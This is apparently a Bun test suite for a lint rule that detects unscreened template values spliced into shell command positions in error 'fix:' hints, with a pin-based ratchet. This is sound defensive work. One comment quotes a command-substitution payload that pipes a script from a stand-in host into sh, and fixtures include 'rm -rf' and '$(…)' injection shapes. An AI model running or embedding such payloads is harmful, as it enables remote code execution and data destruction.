// biome-ignore-all lint/suspicious/noTemplateCurlyInString: every fixture below is SOURCE TEXT — a
// literal ${…} inside a string is the case under test, and this rule cannot be exercised without one
//
// The enforcement half of `scripts/fix-shell-arg.ts`: this file IS the build error. The gate's
// `unit` step runs every `scripts/**/*.test.ts`, so a value spliced into the command position of a
// `fix:` line fails `bun run verify` with no extra wiring. The real tree is asserted
// NON-VACUOUSLY — a scan that read nothing reports "every package at its pin", which is the answer
// a clean tree gives.

import { describe, expect, setDefaultTimeout, test } from 'bun:test';
import {
  checkFixShellArgs,
  fixShellArgCounts,
  fixShellArgFindingFor,
  fixShellArgGaps,
  scanFixShellArgs,
} from './fix-shell-arg';
import { FIX_SHELL_ARG_PINS, FIX_SHELL_PINS_FILE } from './lib/fix-shell-arg-pins';
import { REPO_SCAN_TIMEOUT_MS, repoRoot } from './lib/run';

// Reads the real tree, so it runs on the repo-scan backstop rather than Bun's 5000ms default.
setDefaultTimeout(REPO_SCAN_TIMEOUT_MS);

const ROOT = repoRoot();
const PATH = 'packages/x/src/errors.ts';

/** A `fix:` whose value is one template, written the way every declaration in this tree writes it. */
const fixLine = (body: string): string =>
  ['new XError({', "  code: 'X_BAD',", "  cause: 'it broke',", `  fix: \`${body}\`,`, '});'].join(
    '\n',
  );

const at = (body: string): readonly string[] =>
  scanFixShellArgs(PATH, fixLine(body)).map((site) => site.substitution);

describe('a substitution in command position', () => {
  test('an argument to a command word is reported — this is the shape that shipped', () => {
    // `x g route /$(curl -s http://evil.sh|sh)` was a real rendered fix, for an unauthenticated
    // GET against any unrouted path. `packages/core/src/error-render.ts` exists because of it.
    expect(at('x g route ${path}')).toEqual(['path']);
  });

  test('every command word in the vocabulary, not just `x`', () => {
    expect(at('bun run ${script}')).toEqual(['script']);
    expect(at('psql ${url}')).toEqual(['url']);
    expect(at('rm -rf ${dir}')).toEqual(['dir']);
    expect(at('docker build -t ${tag} .')).toEqual(['tag']);
  });

  test('a command word opened after a pipe or a semicolon counts too', () => {
    expect(at('x db migrate; psql ${url}')).toEqual(['url']);
    expect(at('cat file | sed ${expr}')).toEqual(['expr']);
  });

  test('and a substitution sitting DIRECTLY after a shell operator is a command itself', () => {
    expect(at('x verify && ${next}')).toEqual(['next']);
    expect(at('x verify; ${next}')).toEqual(['next']);
    expect(at('echo hi | ${next}')).toEqual(['next']);
    expect(at('export KEY="$(${next})"')).toEqual(['next']);
  });
});

describe('what is never reported', () => {
  test('a value already screened by the framework’s own renderer', () => {
    expect(at('x g route ${renderFixShellArg(path, "<the path>")}')).toEqual([]);
    expect(at('psql ${shellInertIdentifier(table)}')).toEqual([]);
    expect(at('bun run ${quoteArg(script)}')).toEqual([]);
  });

  // The screen has to be the WHOLE body, not its prefix: `renderFixShellArg(p, '<p>') + tail` opens
  // with an approved call and puts `tail` straight into the command position behind it. An end
  // anchor alone does not close it either — a tail ending in `)` satisfies one.
  test('…but only when the approved call IS the whole substitution', () => {
    expect(at('curl ${renderFixShellArg(url, "<the url>") + suffix}')).toHaveLength(1);
    expect(at('curl ${renderFixShellArg(url, "<the url>") + f(suffix)}')).toHaveLength(1);
    expect(at('curl ${renderFixShellArg(url, "<the url>")}')).toEqual([]);
    // Whitespace and a nested call inside the approved one are still the whole body.
    expect(at('curl ${ renderFixShellArg(join(a, b), "<the path>") }')).toEqual([]);
  });

  test('prose — a substitution with no command word in front of it', () => {
    expect(at('add ${key} to app.config.ts')).toEqual([]);
    expect(at('the entity ${name} declares no tenant')).toEqual([]);
  });

  test('a value after a shell COMMENT, which never runs', () => {
    expect(at('x verify   # then look at ${detail}')).toEqual([]);
  });

  test('prose that merely CONTAINS a command word is not a command position', () => {
    // The three shapes that made this rule noisy before it was narrowed: an em dash, a comma and an
    // opening parenthesis between the word and the substitution mean the line is describing.
    expect(at('run x verify — it names ${count} findings')).toEqual([]);
    expect(at('x verify, then read ${detail}')).toEqual([]);
    expect(at('x db gen (after editing ${file})')).toEqual([]);
  });

  test('a `cause:` is not a `fix:` — a cause is never pasted into a shell', () => {
    const source = [
      'new XError({',
      '  cause: `x g route ${path}`,',
      "  fix: 'x verify',",
      '});',
    ].join('\n');
    expect(scanFixShellArgs(PATH, source)).toEqual([]);
  });

  test('a `prefix:` / `e.fix` is not the field either', () => {
    expect(scanFixShellArgs(PATH, 'const prefix = `x g route ${path}`;')).toEqual([]);
    expect(scanFixShellArgs(PATH, 'const a = other.fix;\nconst b = `x g route ${p}`;')).toEqual([]);
  });
});

// Measured on the first run: three of the four operator-position hits were markdown table cells in
// a `fix:` telling an operator which ROW to edit. A rule spelled "a `|` before the substitution"
// reports every one of them, and noise is how a rule gets switched off.
describe('a markdown table pipe is not a shell pipe', () => {
  test('a `|` opening a quoted fragment is a table cell', () => {
    expect(at('edit ROADMAP.md: the row starting "| ${n} |"')).toEqual([]);
    expect(at('add a `| ${dir} | ${tier} |` row to the table')).toEqual([]);
  });

  test('but `$(` is a command substitution even inside double quotes', () => {
    expect(at('export KEY="$(${value})"')).toEqual(['value']);
  });
});

describe('the ratchet', () => {
  const site = { path: 'packages/x/src/errors.ts', line: 4, substitution: 'path', command: 'x' };

  test('a package over its pin is reported, and the fix names the renderer', () => {
    const gaps = checkFixShellArgs({ sites: [site], pins: {}, scanned: true });
    expect(gaps.map((gap) => gap.kind)).toEqual(['over']);
    const finding = fixShellArgFindingFor(gaps[0] as never);
    expect(finding.code).toBe('X_FIX_SHELL_ARG_UNSCREENED');
    expect(finding.fix).toContain('renderFixShellArg');
    expect(finding.at).toBe('packages/x/src/errors.ts:4');
  });

  test('a pin holds it, and a pin above the tree is stale with the command that lowers it', () => {
    const pins = { x: { count: 1, reason: 'measured, and every one is a literal' } };
    expect(checkFixShellArgs({ sites: [site], pins, scanned: true })).toEqual([]);
    const stale = checkFixShellArgs({ sites: [], pins, scanned: true });
    expect(fixShellArgFindingFor(stale[0] as never).code).toBe('X_FIX_SHELL_ARG_PIN_STALE');
  });

  test('a pin with a blank reason waives nothing', () => {
    const gaps = checkFixShellArgs({
      sites: [site],
      pins: { x: { count: 1, reason: '  ' } },
      scanned: true,
    });
    expect(gaps.map((gap) => gap.kind)).toContain('unexplained');
    const finding = fixShellArgFindingFor(gaps.find((gap) => gap.kind === 'unexplained') as never);
    expect(finding.code).toBe('X_FIX_SHELL_ARG_PIN_UNEXPLAINED');
  });

  test('an empty corpus is UNSCANNED, never a clean tree', () => {
    const gaps = checkFixShellArgs({ sites: [], pins: {}, scanned: false });
    expect(fixShellArgFindingFor(gaps[0] as never).code).toBe('X_FIX_SHELL_ARG_UNSCANNED');
  });
});

describe('the real tree', () => {
  test('every pin carries a sentence, and a count above zero', () => {
    for (const pin of Object.values(FIX_SHELL_ARG_PINS)) {
      expect(pin.reason.trim().length).toBeGreaterThan(50);
      expect(pin.count).toBeGreaterThan(0);
    }
    expect(FIX_SHELL_PINS_FILE).toBe('scripts/lib/fix-shell-arg-pins.ts');
  });

  test('is on the ratchet, and the scan really read it', async () => {
    const counts = await fixShellArgCounts(ROOT);
    // Non-vacuity: the scan found sites at all. A glob that stopped matching would make this suite
    // green by making the rule blind, which is how every sibling rule here has failed once.
    expect(Object.values(counts).reduce((sum, one) => sum + one, 0)).toBeGreaterThan(20);
    expect(await fixShellArgGaps(ROOT)).toEqual([]);
  });
});
